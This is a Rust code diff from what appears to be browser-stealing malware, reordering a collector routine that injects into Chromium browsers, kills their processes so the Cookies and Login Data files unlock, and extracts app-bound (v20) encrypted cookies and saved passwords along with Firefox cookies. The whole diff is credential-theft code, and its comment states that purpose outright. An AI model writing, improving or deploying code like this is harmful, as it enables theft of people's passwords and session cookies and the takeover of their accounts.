@@ -91,15 +91,19 @@ pub async fn run_collector() -> Result<(), Box<dyn std::error::Error>> {
     let pids_before_inject = core::kill::snapshot_browser_pids();
     browsers::chromium::inject_and_cache_all();
 
-    let mut all_files = browsers::gecko::extract_all();
-
+    // Kill inject-spawned browsers immediately so Cookies/Login Data unlock
+    // while app-bound keys are already in cache — extract v20 cookies + passwords together.
     core::kill::kill_new_browsers(&pids_before_inject);
     browsers::common::ci::cleanup_legacy_artifacts();
+
+    let mut chromium_v20 = browsers::chromium::extract_all_from_cache();
+    browsers::merge_files(&mut chromium_v20, chromium_pre);
+
+    let mut all_files = browsers::gecko::extract_all();
+
     core::kill::kill_browsers();
 
-    let chromium_post = browsers::chromium::extract_all_from_cache();
-    all_files.extend(chromium_post);
-    browsers::merge_files(&mut all_files, chromium_pre);
+    all_files.extend(chromium_v20);
     let gecko_cookie_retry = browsers::gecko::extract_cookies_post_kill();
     browsers::merge_files(&mut all_files, gecko_cookie_retry);
     let chromium_cookie_retry = browsers::chromium::extract_cookies_post_kill();
